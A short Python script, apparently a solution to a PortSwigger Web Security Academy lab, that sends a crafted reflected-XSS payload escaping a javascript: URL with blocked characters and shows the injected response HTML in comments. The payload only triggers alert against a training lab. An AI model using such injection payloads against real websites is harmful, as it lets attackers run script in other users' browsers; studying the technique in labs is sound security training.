# https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-url-some-characters-blocked
import requests

requests.packages.urllib3.disable_warnings()

scheme = "https://"
host = "ac8b1fc41f30a9798040bb1400810039.web-security-academy.net"
path = "/post"
url = scheme + host + path
proxy = "127.0.0.1:8080"
verify = False
proxies = {scheme: proxy}
payload = "x=>{throw/**/onerror=alert,4},toString=x,window+'',{x:'"
params = {"postId": "5", "&'},x": payload}

requests.get(url, params=params, verify=verify, proxies=proxies)

# This is what the output looks like from the response when the only query string is postId:
# <a href="javascript:
# fetch(
#    "/analytics",
#    { method: "post", body: '/post?postId=5' }
# ).finally((_) => (window.location = "/"));
# ">Back to Blog</a>

# This is the output from adding the javascript payload:
# <a href="javascript:
# fetch(
#   "/analytics",
#   { method: "post", body: '/post?postId=5&&' },
#   (x = (x) => {
#     throw /**/ ((onerror = alert), 4);
#   }),
#   (toString = x),
#   window + '',
#   { x: '' }
# ).finally((_) => (window.location = "/"));
# ">Back to Blog</a>

# The way that this challenge works is by noticing that the path and query string parameters are present inside a string
# in a javascript call to fetch() in the response output. You also need to know a lot of obscure javascript syntax.